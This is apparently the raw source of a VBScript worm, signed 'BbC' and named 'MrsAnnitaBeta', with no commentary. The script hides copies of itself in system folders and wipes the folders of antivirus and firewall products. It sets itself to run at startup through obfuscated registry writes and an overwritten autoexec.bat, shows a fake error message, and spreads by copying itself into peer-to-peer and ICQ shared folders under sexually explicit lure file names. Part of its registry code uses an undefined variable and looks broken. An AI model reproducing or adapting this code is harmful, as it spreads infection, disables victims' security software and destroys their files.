Rem By BbC say hello!!
DIM tf,WORD,MRSANNITA,FIRST,FILE,CE,FIRSTvariables,SECONDvariables,THIRTvariables,FORTHvariables,variables5,variables6,variablesX1,variablesX2,variablesX3,variablesX4,variablesX5,variablesX6,variablesX7
FIRSTvariables="Scr"
SECONDvariables="ipt"
THIRTvariables="ing."
FORTHvariables="Fi"
variables5="lesys"
variables6="temOb"
Set FIRST = CreateObject(FIRSTvariables+SECONDvariables+THIRTvariables+FORTHvariables+variables5+variables6+"ject")
Set FILE = FIRST.opentextfile(Wscript.ScriptFullName, 1)
Set CE = FIRST.GetFile(Wscript.ScriptFullName)
On error resume Next
CE.Copy ("C:\Windows\MrsAnnitaBeta.vbs")
CE.Attributes = Attributes + 4
On error resume Next
CE.Copy ("C:\WinNT\MrsAnnitaBeta.vbs")
CE.Attributes = Attributes + 4
dim AV13
AV13 = "C:\Program Files\Grisoft\AVG6\"
If CE.FolderExists(AV13) = True Then Kill AV13 & "*.*"
Dim AV1,AV2,AV3,AV4,AV5,AV11
AV1 = "C:\AntiViral Toolkit Pro\"
AV2 = "C:\Program Files\Command Software\F-PROT95\"
AV3 = "C:\Program Files\McAfee\VirusScan\"
AV4 = "C:\Program Files\Norton AntiVirus\"
AV5 = "C:\Toolkit\FindVirus\"
AV11 = "C:\Program Files\Panda Software\Panda Antivirus Titanium\"
If CE.FolderExists(AV1) = True Then Kill AV1 & "*.*"
If CE.FolderExists(AV2) = True Then Kill AV2 & "*.*"
If CE.FolderExists(AV3) = True Then Kill AV3 & "*.*"
If CE.FolderExists(AV4) = True Then Kill AV4 & "*.*"
If CE.FolderExists(AV5) = True Then Kill AV5 & "*.*"
If CE.FolderExists(AV11) = True Then Kill AV11 & "*.*"
dim FW2
FW2 = "C:\Program Files\Tiny Personal Firewall\"
If CE.FolderExists(FW2) = True Then Kill FW2 & "*.*"
Dim AV6,AV7,AV20
AV6 = "C:\PC-Cillin 95\"
AV7 = "C:\PC-Cillin 97\"
AV20 = "C:\Program Files\Trend Micro\PC-cillin 2002\"
On error resume Next
If CE.FolderExists(AV6) = True Then Kill AV6 & "*.*"
If CE.FolderExists(AV7) = True Then Kill AV7 & "*.*"
If CE.FolderExists(AV20) = True Then Kill AV20 & "*.*"
Dim FW1z, FW2z
FW1z = "C:\Program Files\Zone Labs\ZoneAlarm\"
FW2z = "C:\Program Files\Tiny Personal Firewall\"
If CE.FolderExists(FW1z) = True Then Kill FW1z & "*.*"
If CE.FolderExists(FW2z) = True Then Kill FW2z & "*.*"
variablesX1="S"
variablesX2="hell"
Set MRSANNITA = WScript.CreateObject("W"+FIRSTvariables+SECONDvariables+"."+variablesX1+variablesX2)
MRSANNITA.RegWrite "HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles\Folder","Larva"
On error resume Next
grok
Function grok()
On error resume Next
CE.Copy ("C:\Program Files\Grokster\My Grokster\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\Program Files\Grokster\My Grokster\Sperm Death.Zip.VBS")
CE.Copy ("C:\Program Files\Grokster\My Grokster\Win1000$.Zip.vbs")
CE.Copy ("C:\Program Files\Grokster\My Grokster\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\Program Files\Grokster\My Grokster\Protect your pc.zip.vbs")
CE.Copy ("C:\Program Files\Grokster\My Grokster\LasKetChupXXX.jpg.vbs")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\Sperm Death.Zip.VBS")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\Win1000$.Zip.vbs")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\Protect your pc.zip.vbs")
CE.Copy ("C:\ARCHIV~1\Grokster\My Grokster\LasKetChupXXX.jpg.vbs")
End Function
On error resume Next
morpheus
Function morpheus()
On error resume Next
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\Sperm Death.Zip.VBS")
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\Win1000$.Zip.vbs")
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\Protect your pc.zip.vbs")
CE.Copy ("C:\Program Files\Morpheus\My Shared Folder\LasKetChupXXX.jpg.vbs")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\Sperm Death.Zip.VBS")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\Win1000$.Zip.vbs")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\Protect your pc.zip.vbs")
CE.Copy ("C:\archiv~1\Morpheus\My Shared Folder\LasKetChupXXX.jpg.vbs")
End Function
REM ---ICQ---
On error resume Next
icq
Function icq()
On error resume Next
CE.Copy ("C:\Program Files\ICQ\shared files\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\Program Files\ICQ\shared files\Sperm Death.Zip.VBS")
CE.Copy ("C:\Program Files\ICQ\shared files\Win1000$.Zip.vbs")
CE.Copy ("C:\Program Files\ICQ\shared files\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\Program Files\ICQ\shared files\Protect your pc.zip.vbs")
CE.Copy ("C:\Program Files\ICQ\shared files\LasKetChupXXX.jpg.vbs")
CE.Copy ("C:\archiv~1\ICQ\shared files\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\archiv~1\ICQ\shared files\Sperm Death.Zip.VBS")
CE.Copy ("C:\archiv~1\ICQ\shared files\Win1000$.Zip.vbs")
CE.Copy ("C:\archiv~1\ICQ\shared files\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\archiv~1\ICQ\shared files\Protect your pc.zip.vbs")
CE.Copy ("C:\archiv~1\ICQ\shared files\LasKetChupXXX.jpg.vbs")
End Function
REM bear
On error resume Next
bear
Function bear()
On error resume next
CE.Copy ("C:\Program Files\Bearshare\Shared\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\Program Files\Bearshare\Shared\Sperm Death.Zip.VBS")
CE.Copy ("C:\Program Files\Bearshare\Shared\Win1000$.Zip.vbs")
CE.Copy ("C:\Program Files\Bearshare\Shared\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\Program Files\Bearshare\Shared\Protect your pc.zip.vbs")
CE.Copy ("C:\Program Files\Bearshare\Shared\LasKetChupXXX.jpg.vbs")
CE.Copy ("C:\archiv~1\Bearshare\Shared\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\archiv~1\Bearshare\Shared\Sperm Death.Zip.VBS")
CE.Copy ("C:\archiv~1\Bearshare\Shared\Win1000$.Zip.vbs")
CE.Copy ("C:\archiv~1\Bearshare\Shared\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\archiv~1\Bearshare\Shared\Protect your pc.zip.vbs")
CE.Copy ("C:\archiv~1\Bearshare\Shared\LasKetChupXXX.jpg.vbs")
End Function
REM KAZAA
On error resume Next
KAZAA
Function KAZAA()
On error resume next
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\Sperm Death.Zip.VBS")
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\Win1000$.Zip.vbs")
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\Protect your pc.zip.vbs")
CE.Copy ("C:\Program Files\KaZaA\My Shared Folder\LasKetChupXXX.jpg.vbs")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\Hard Fucking.Jpg.vbs")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\Sperm Death.Zip.VBS")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\Win1000$.Zip.vbs")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\SilviaSaintDoubleAnalAction.jpg.vbs")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\Protect your pc.zip.vbs")
CE.Copy ("C:\ARCHIV~1\KaZaA\My Shared Folder\LasKetChupXXX.jpg.vbs")
End Function
variablesX1="S"
variablesX2="hell"
variablesX3="HK"
variablesX4="EY"
variablesX5="LOC"
variablesX6="AL"
variablesX7="HINE"
WORD = variablesX3+variablesX4+"_"+variablesX5+variablesX6+"_"+"MAC"+variablesX7
variablesX3="\So"
variablesX4="ftwa"
variablesX5="re"
variablesX6="Mic"
variablesX7="ros"
WORD = palabra+variablesX3+variablesX4+variablesX5+"\"+variablesX6+variablesX7+"oft"
variablesX3="\Wi"
variablesX4="ndo"
variablesX5="ws"
variablesX6="Cur"
variablesX7="rent"
WORD = palabra+variablesX3+variablesX4+variablesX5+"\"+variablesX6+variablesX7
variablesX3="Vers"
variablesX4="ion"
variablesX5="Ru"
variablesX6="n"
variablesX7="MRSANNITA"
WORD = palabra+variablesX3+variablesX4+"\"+variablesX5+variablesX6+"\"+variablesX7
Set MRSANNITA = WScript.CreateObject("W"+FIRSTvariables+SECONDvariables+"."+variablesX1+variablesX2)
MRSANNITA.RegWrite WORD,"C:\Windows\MrsAnnitaBeta.vbs"
MRSANNITA.RegWrite WORD+"x","C:\WinNT\MrsAnnitaBeta.vbs"
Set tf = FIRST.CreateTextFile("c:\Autoexec.bat", True)
tf.WriteLine ("@Start C:\windows\MrsAnnitaBeta.vbs>nul")
tf.WriteLine ("@Start C:\winnt\MrsAnnitaBeta.vbs>nul")
tf.WriteLine ("cls")
MsgBox "Not a Win32 app.Error on module DllExec.", vbInformation, "eRROR"
